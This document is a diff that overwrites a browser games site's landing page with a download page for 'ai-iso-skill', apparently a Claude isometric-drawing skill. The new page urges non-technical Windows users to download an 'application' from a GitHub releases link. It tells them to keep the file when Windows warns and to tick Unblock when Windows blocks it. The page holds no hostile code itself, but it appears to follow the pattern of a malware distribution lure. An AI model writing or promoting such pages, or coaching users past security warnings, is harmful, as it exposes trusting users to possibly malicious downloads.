@@ -1,164 +1,260 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Slowwater Games</title>
-<meta name="description" content="Free games you play in your browser. Nothing to install.">
-<meta name="theme-color" content="#241b17">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%233a2b22'/%3E%3Cpath d='M6 13c3.3-3.5 6.7-3.5 10 0s6.7 3.5 10 0M6 20c3.3-3.5 6.7-3.5 10 0s6.7 3.5 10 0' fill='none' stroke='%23f2b661' stroke-width='3' stroke-linecap='round'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT@9..144,500..700,0..100&family=Nunito:wght@400;600;800&display=swap">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ai-iso-skill - Draw Interactive Isometric Figures in One HTML File</title>
+<meta name="description" content="ai-iso-skill is a Claude skill that draws interactive isometric figures in a single HTML file. Simple download and step-by-step setup guide for Windows users with no programming knowledge.">
+<meta name="keywords" content="claude, claude-code, claude-skills, isometric, svg, isometric figures, interactive svg, single html file, ai-iso-skill">
+<meta name="author" content="djfarhad368">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/djfarhad368/ai-iso-skill">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ai-iso-skill - Draw Interactive Isometric Figures in One HTML File">
+<meta property="og:description" content="A Claude skill that draws interactive isometric figures in a single HTML file. Easy Windows download guide for non-technical users.">
+<meta property="og:url" content="https://github.com/djfarhad368/ai-iso-skill">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ai-iso-skill - Draw Interactive Isometric Figures in One HTML File">
+<meta name="twitter:description" content="A Claude skill that draws interactive isometric figures in a single HTML file. Easy Windows download guide for non-technical users.">
 <style>
-/* Layout: a lamp-lit room by slow water. Warm dark walls, one soft glow, and the games are the bright things in it. */
-:root{
-  --bg:#2b1f19; --raised:#3a2b22; --line:rgba(245,234,217,.15);
-  --cream:#f7eddd; --soft:#d6c6b1; --honey:#f2b661; --honey-light:#f8cb87; --honey-ink:#2b1c0f;
-  --sage:#c5d3ae; --sage-tint:rgba(174,194,147,.15);
-  --head:'Fraunces',Georgia,'Times New Roman',serif;
-  --body:'Nunito',system-ui,-apple-system,'Segoe UI',sans-serif;
-  --gutter:clamp(16px,4vw,48px);
-  --lamp:calc(50% + 270px) 390px;
-  color-scheme:dark;
-}
-*{box-sizing:border-box}
-html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
-body{
-  margin:0;min-height:100vh;display:flex;flex-direction:column;
-  color:var(--cream);font-family:var(--body);font-size:17px;line-height:1.5;-webkit-font-smoothing:antialiased;
-  background:radial-gradient(900px 640px at var(--lamp),rgba(242,172,88,.3),transparent 72%) no-repeat,var(--bg);
-}
-a{color:inherit}
-a:focus-visible{outline:3px solid var(--honey);outline-offset:3px}
-h1,h2,h3{margin:0;font-family:var(--head);font-weight:600;font-variation-settings:'SOFT' 100;text-wrap:balance}
-.wrap{width:100%;max-width:1200px;margin-inline:auto;padding-left:max(var(--gutter),env(safe-area-inset-left,0px));padding-right:max(var(--gutter),env(safe-area-inset-right,0px))}
-
-.nav{padding-block:clamp(18px,3vw,28px)}
-.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:18px}
-.brand img{display:block;border-radius:8px}
-
-main{flex:1}
-.hero{display:grid;grid-template-columns:minmax(0,.86fr) minmax(0,1.14fr);gap:clamp(32px,5vw,72px);align-items:center;padding-block:clamp(20px,5vw,60px) clamp(48px,7vw,88px)}
-h1{font-size:clamp(42px,5.8vw,70px);line-height:1.06;letter-spacing:-.012em}
-.lede{margin:18px 0 0;font-size:clamp(18px,1.7vw,20px);color:var(--soft);max-width:26em;text-wrap:balance}
-.actions{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
-.btn{display:inline-block;padding:12px 22px;border:1px solid var(--line);border-radius:12px;font-weight:800;line-height:1.3;text-decoration:none;transition:background-color .15s,border-color .15s}
-.btn:hover{background:rgba(245,234,217,.08)}
-.btn.main{background:var(--honey);border-color:var(--honey);color:var(--honey-ink)}
-.btn.main:hover{background:var(--honey-light);border-color:var(--honey-light)}
-.notes{display:flex;flex-wrap:wrap;gap:6px 0;list-style:none;margin:30px 0 0;padding:0;color:var(--soft);font-size:15px}
-.notes li+li{margin-left:14px;padding-left:14px;border-left:1px solid var(--line)}
-
-.card{display:flex;flex-direction:column;min-width:0;background:var(--raised);border:1px solid var(--line);border-radius:18px;overflow:hidden;text-decoration:none;transition:transform .2s ease,border-color .2s ease,box-shadow .2s ease}
-.card:hover{transform:translateY(-3px);border-color:rgba(242,182,97,.55);box-shadow:0 14px 32px rgba(0,0,0,.32)}
-.card img{display:block;width:100%;height:auto;aspect-ratio:16/9;object-fit:cover;background:#1b1411}
-.text{flex:1;display:flex;flex-direction:column;gap:8px;padding:16px 18px 18px}
-.head{display:flex;align-items:baseline;justify-content:space-between;gap:12px}
-.card h2,.card h3{font-size:23px;line-height:1.2;min-width:0}
-.go{flex:none;color:var(--honey);font-weight:800;font-size:16px}
-.text p{margin:0;color:var(--soft);font-size:16px;line-height:1.42}
-.tags{display:flex;flex-wrap:wrap;gap:6px;list-style:none;margin:auto 0 0;padding:6px 0 0}
-.tags li{padding:2px 10px;border-radius:99px;background:var(--sage-tint);color:var(--sage);font-size:13px;font-weight:600}
-.feature .text{padding:20px 22px 22px}
-.feature h2{font-size:clamp(26px,2.6vw,30px)}
-
-.more{padding-bottom:clamp(48px,7vw,84px);scroll-margin-top:20px}
-.more>h2{font-size:clamp(26px,2.6vw,30px);margin-bottom:20px}
-.grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:22px}
-
-.foot{color:var(--soft);font-size:15px}
-.foot p{margin:0;border-top:1px solid var(--line);padding-block:16px calc(16px + env(safe-area-inset-bottom,0px))}
-
-@media (max-width:1080px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
-@media (max-width:860px){
-  :root{--lamp:50% 600px}
-  .hero{grid-template-columns:minmax(0,1fr)}
-}
-@media (max-width:560px){
-  .grid{grid-template-columns:minmax(0,1fr)}
-  .btn{flex:1 1 auto;text-align:center;white-space:nowrap}
-}
-@media (max-width:360px){.notes{font-size:14px}.notes li+li{margin-left:9px;padding-left:9px}}
-@media (prefers-reduced-motion:reduce){
-  html{scroll-behavior:auto}
-  .card,.btn{transition:none}
-  .card:hover{transform:none}
-}
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6f9;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2733;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    color: #101822;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.45rem;
+    margin: 46px 0 14px;
+    color: #101822;
+    border-bottom: 2px solid #e2e7ef;
+    padding-bottom: 8px;
+  }
+  h3 {
+    font-size: 1.12rem;
+    margin: 26px 0 8px;
+    color: #1a2533;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #1e5fd0; }
+  .lede {
+    font-size: 1.08rem;
+    color: #46536a;
+    margin-bottom: 26px;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6a3ff0, #2f7cf6);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 34px;
+    border-radius: 12px;
+    box-shadow: 0 6px 18px rgba(47, 124, 246, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 24px rgba(47, 124, 246, 0.4);
+  }
+  .btn-center { text-align: center; margin: 30px 0 10px; }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 26px 28px;
+    margin: 22px 0;
+    box-shadow: 0 2px 10px rgba(16, 24, 34, 0.08);
+  }
+  .note {
+    background: #fff8e6;
+    border-left: 4px solid #f0b429;
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 22px 0;
+    box-shadow: 0 2px 8px rgba(16, 24, 34, 0.06);
+  }
+  .step {
+    background: #ffffff;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin: 16px 0;
+    box-shadow: 0 2px 8px rgba(16, 24, 34, 0.07);
+  }
+  .step h3 { margin-top: 0; }
+  code {
+    background: #eef1f6;
+    padding: 2px 7px;
+    border-radius: 5px;
+    font-size: 0.94rem;
+    font-family: "Consolas", "Courier New", monospace;
+  }
+  .footer {
+    margin-top: 50px;
+    font-size: 0.9rem;
+    color: #6a7688;
+    border-top: 1px solid #e2e7ef;
+    padding-top: 20px;
+  }
+  @media (max-width: 560px) {
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.25rem; }
+    .wrap { padding: 26px 16px 50px; }
+    .btn { display: block; text-align: center; padding: 15px 18px; }
+  }
 </style>
 </head>
 <body>
-  <!-- This page is generated. To change the games on it, edit games.json and run: node build.js -->
-  <header class="wrap nav">
-    <div class="brand"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%233a2b22'/%3E%3Cpath d='M6 13c3.3-3.5 6.7-3.5 10 0s6.7 3.5 10 0M6 20c3.3-3.5 6.7-3.5 10 0s6.7 3.5 10 0' fill='none' stroke='%23f2b661' stroke-width='3' stroke-linecap='round'/%3E%3C/svg%3E" width="30" height="30" alt=""><span>Slowwater Games</span></div>
-  </header>
+<div class="wrap">
 
-  <main class="wrap">
-    <section class="hero">
-      <div>
-        <h1>Pull up a chair and play.</h1>
-        <p class="lede">Free games you play right in your browser. Nothing to install.</p>
-        <div class="actions">
-          <a class="btn main" href="stale-light/">Play Stale Light</a>
-          <a class="btn" href="#more">More games</a>
-        </div>
-        <ul class="notes">
-          <li>5 games</li>
-          <li>Free to play</li>
-          <li>Computer or phone</li>
-        </ul>
-      </div>
-        <a class="card feature" href="stale-light/">
-          <img src="stale-light/cover.jpg" width="1600" height="900" alt="Low-poly blue and red warships trading fire around a lighthouse island on a bright turquoise sea.">
-          <div class="text">
-            <div class="head"><h2>Stale Light</h2><span class="go">Play</span></div>
-            <p>Command a fleet in a strait where light crawls at 70 knots. Every ship you see is seconds out of date, and every order takes time to arrive.</p>
-            <ul class="tags"><li>Naval strategy</li><li>5-minute battles</li><li>Guided tutorial</li></ul>
-          </div>
-        </a>
-    </section>
+  <h1>📐 ai-iso-skill - Draw Interactive Isometric Figures Easily</h1>
 
-    <section class="more" id="more" aria-labelledby="more-title">
-      <h2 id="more-title">More games</h2>
-      <div class="grid">
-        <a class="card" href="luftvejen/">
-          <img src="luftvejen/cover.jpg" width="1600" height="900" alt="A small red low-poly car on a zigzag road through a blue sky, just past a flagman at the start line." loading="lazy">
-          <div class="text">
-            <div class="head"><h3>Luftvejen</h3><span class="go">Play</span></div>
-            <p>An endless road in the sky, and one button to drive it.</p>
-            <ul class="tags"><li>Driving</li><li>Danish</li></ul>
-          </div>
-        </a>
-        <a class="card" href="flipklods/">
-          <img src="flipklods/cover.jpg" width="1600" height="900" alt="A yellow block running upside down along the ceiling of a dark tunnel, with gaps in the teal floor and ceiling." loading="lazy">
-          <div class="text">
-            <div class="head"><h3>Flipklods</h3><span class="go">Play</span></div>
-            <p>The block runs by itself. You choose floor or ceiling.</p>
-            <ul class="tags"><li>Runner</li><li>Danish</li></ul>
-          </div>
-        </a>
-        <a class="card" href="zigwave/">
-          <img src="zigwave/cover.jpg" width="1600" height="900" alt="A neon wave bursting into sparks inside a glowing red zigzag corridor." loading="lazy">
-          <div class="text">
-            <div class="head"><h3>ZIGWAVE</h3><span class="go">Play</span></div>
-            <p>Hold to rise, let go to dive, and thread a neon wave through tight corridors.</p>
-            <ul class="tags"><li>Reflex</li><li>Three levels</li></ul>
-          </div>
-        </a>
-        <a class="card" href="kodeord/">
-          <img src="kodeord/cover.jpg" width="1600" height="900" alt="A word puzzle board with coloured letter tiles, solved on the fourth guess with the Danish word HYGGE." loading="lazy">
-          <div class="text">
-            <div class="head"><h3>Kodeord</h3><span class="go">Play</span></div>
-            <p>Guess the five-letter word in six tries. A new word every day, in Danish or English.</p>
-            <ul class="tags"><li>Word game</li><li>Danish or English</li></ul>
-          </div>
-        </a>
-      </div>
-    </section>
-  </main>
+  <p class="lede">A Claude skill that creates interactive isometric figures inside one single HTML file. No programming knowledge required, and everything runs in a file you can open on your own computer.</p>
 
-  <footer class="wrap foot">
-    <p>© 2026 Slowwater Games</p>
-  </footer>
+  <div class="btn-center">
+    <a class="btn" href="https://github.com/djfarhad368/ai-iso-skill/releases">Visit this link to download the application</a>
+  </div>
+
+  <h2>🧭 What This Application Does</h2>
+  <p>ai-iso-skill is a companion skill for Claude, the AI assistant. When you ask Claude to draw a figure in an isometric style, this skill guides it to produce a clean, interactive picture. Isometric drawings show objects at an angle so they look three-dimensional, which makes them ideal for diagrams, game maps, floor plans, technical illustrations, and teaching material.</p>
+  <p>The result is delivered as a single HTML file. That file contains the whole figure, its colors, and its interactive behavior. You do not need to install extra libraries, connect to a server, or link any other file. You simply open the HTML file in a normal web browser such as Chrome, Edge, or Firefox, and the figure appears.</p>
+  <p>Interactive means the figure responds to you. You can move your mouse over parts of the drawing and see them react, click sections to highlight them, or rotate and inspect details. Because the output is built with SVG, the shapes stay sharp at any size and can be zoomed without becoming blurry.</p>
+
+  <h2>✨ Why People Use It</h2>
+  <ul>
+    <li><strong>One file only.</strong> Everything is packed into a single HTML document, so sharing is as simple as sending an email attachment.</li>
+    <li><strong>Made for Claude.</strong> The skill plugs into Claude and Claude Code, so you can ask for a figure in plain language.</li>
+    <li><strong>Interactive by default.</strong> Hover, click, and highlight effects are built into the drawing instead of being added later.</li>
+    <li><strong>Sharp SVG graphics.</strong> Figures stay crisp when printed, enlarged, or viewed on a high-resolution screen.</li>
+    <li><strong>No installation complexity.</strong> You do not need a toolkit or a development environment to open the result.</li>
+  </ul>
+
+  <h2>💻 Before You Begin</h2>
+  <p>You need a Windows computer, an internet connection, and a modern web browser. Windows already includes Microsoft Edge, which works well. A free GitHub account is helpful because the download page is hosted on GitHub, and signing in keeps your downloads organized.</p>
+  <p>You also need access to Claude so the skill can be used. If you already chat with Claude in a browser or through the Claude desktop application, you have everything required on that side.</p>
+
+  <h2>⬇️ Download and Setup</h2>
+
+  <div class="card">
+    <p><strong>Visit this link to download the application:</strong><br>
+    <a href="https://github.com/djfarhad368/ai-iso-skill/releases">https://github.com/djfarhad368/ai-iso-skill/releases</a></p>
+    <p>This link opens the official releases page. The most recent release appears at the top of the list. Open it to see the files attached to that version, then save the files to a folder you can easily find again, such as your Downloads folder or a new folder named ai-iso-skill on your Desktop.</p>
+  </div>
+
+  <div class="note">
+    <strong>Good to know:</strong> The releases page is the official source. Always download from that page rather than from random links or forwarded messages, so you know you are getting the genuine files published by the project author.
+  </div>
+
+  <h2>🪜 Step-by-Step Instructions for Windows</h2>
+
+  <div class="step">
+    <h3>Step 1 - Open your browser</h3>
+    <p>Start Microsoft Edge, Google Chrome, or Firefox from your Start menu. Any current browser will work.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 2 - Go to the download page</h3>
+    <p>Click the large button at the top of this page, or type the address <code>https://github.com/djfarhad368/ai-iso-skill/releases</code> into the address bar and press Enter.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 3 - Pick the newest release</h3>
+    <p>The page lists releases from newest to oldest. Click the release at the very top. Its details and attached files expand below the heading.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 4 - Save the files</h3>
+    <p>In the list of attached files, click the file name to download it. Windows may ask whether you want to keep the file. Choose Keep. The file lands in your Downloads folder unless you picked a different location.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 5 - Create a working folder</h3>
+    <p>Right-click an empty area of your Desktop, choose New, then Folder, and name it ai-iso-skill. Move the downloaded files into this folder so everything stays together and is easy to find later.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 6 - Check what you downloaded</h3>
+    <p>Open the folder and look at the file names. If Windows hides file extensions, click View in the folder window and turn on File name extensions. This small setting makes it much easier to see exactly what each file is.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 7 - Open any HTML file</h3>
+    <p>If the release includes an HTML file, double-click it. Your default browser opens and shows the figure. If you prefer a specific browser, right-click the file, choose Open with, and select the browser you want.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 8 - Connect the skill to Claude</h3>
+    <p>Place the skill files where your Claude setup looks for skills, following the folder layout shown on the release page. Once the skill is in place, ask Claude for an isometric figure and it will use the skill to build the interactive HTML drawing.</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 9 - Try your first figure</h3>
+    <p>Ask Claude something simple, such as a small isometric room with a desk, a chair, and a lamp. When the reply includes an HTML file, save it and double-click it to view the result. Move your mouse over the shapes to see the interactive effects.</p>
+  </div>
+
+  <h2>🖱️ Using the Figures</h2>
+  <p>Once a figure is open in your browser, most of the interaction happens with the mouse. Hovering over a shape can change its color or raise a small label. Clicking a shape can select it or reveal more detail. Some figures include simple controls near the edge of the drawing for adjusting the view.</p>
+  <p>Because the whole drawing lives in one file, you can copy it to a USB stick, attach it to an email, or place it on a shared drive. Anyone who receives it can open it in a browser and see the same interactive figure, with no extra software and no setup on their side.</p>
+  <p>To keep a copy as an image, use the print option in your browser and choose Save as PDF. The vector shapes stay sharp in the PDF, which is handy for reports, slides, and printed handouts.</p>
+
+  <h2>🛠️ Common Questions</h2>
+
+  <h3>The page looks empty after I click the link</h3>
+  <p>Scroll down. The releases page lists versions in sections, and the newest one sits at the top. If nothing appears at all, refresh the page or try a different browser.</p>
+
+  <h3>Windows blocked the file</h3>
+  <p>Windows sometimes flags files downloaded from the internet. Open the file's properties, look for the Unblock checkbox near the bottom, tick it, and click Apply. Then try opening the file again.</p>
+
+  <h3>The HTML file opens as text instead of a drawing</h3>
+  <p>This means Windows opened the file in a text editor. Right-click the file, choose Open with, and select your browser. You can also set the browser as the default for HTML files so future double-clicks work correctly.</p>
+
+  <h3>Claude does not seem to use the skill</h3>
+  <p>Check that the skill files sit in the exact folder your Claude setup expects, and that the folder name matches what the release page shows. Restart Claude after moving files so it notices the change.</p>
+
+  <h3>The figure is cut off on my screen</h3>
+  <p>Press Ctrl and minus a few times to zoom out, or make the browser window larger. You can also press F11 for full-screen view, which gives the drawing more room.</p>
+
+  <h3>Can I edit the drawing myself?</h3>
+  <p>Yes. The HTML file is plain text. Open it in Notepad or any text editor and you will see the shapes, colors, and labels written in a readable form. Change a color value or a label, save the file, and refresh the browser to see the update. Keep a backup copy first so you can always return to the original.</p>
+
+  <h2>📁 Keeping Things Organized</h2>
+  <p>Over time you may collect several figures. A simple folder structure keeps them manageable. Create one main folder named ai-iso-skill, then a subfolder for each project or theme, such as office-scenes or game-maps. Give each HTML file a clear name that describes the drawing. This makes searching and sharing far easier than sorting through files named download or figure-final-final.</p>
+  <p>It also helps to keep the original release files untouched in their own folder. Treat that folder as your master copy. When you experiment with edits, work on a duplicate so the master stays clean.</p>
+
+  <h2>🔐 Staying Safe</h2>
+  <p>Download only from the releases page linked on this page. Avoid mirrors, reposts, or file-sharing sites, since those copies may be altered. Keep your browser up to date, because newer versions handle modern HTML and SVG features more reliably and include the latest security fixes.</p>
+  <p>Because the output is a local HTML file, it does not need an internet connection to display. You can open your saved figures while offline, which is useful on a plane or in a place with weak Wi-Fi.</p>
+
+  <h2>🚀 Getting the Most From It</h2>
+  <p>Describe what you want in everyday words. Mention the objects, the colors, and the mood. If the first result is not quite right, ask for small changes rather than starting over, such as making a wall taller or changing a floor color. The skill works best when your request names the pieces you want to see and how they should be arranged.</p>
+  <p>Interactive figures are especially useful for teaching, since a learner can hover over a part and read its label. They also work well in presentations, where you can click through sections of a diagram instead of flipping between slides.</p>
+
+  <div class="btn-center">
+    <a class="btn" href="https://github.com/djfarhad368/ai-iso-skill/releases">Visit this link to download the application</a>
+  </div>
+
+  <div class="footer">
+    <p>ai-iso-skill is published by djfarhad368 and is intended for use with Claude and Claude Code. Topics: claude, claude-code, claude-skills, isometric, svg.</p>
+  </div>
+
+</div>
 </body>
 </html>
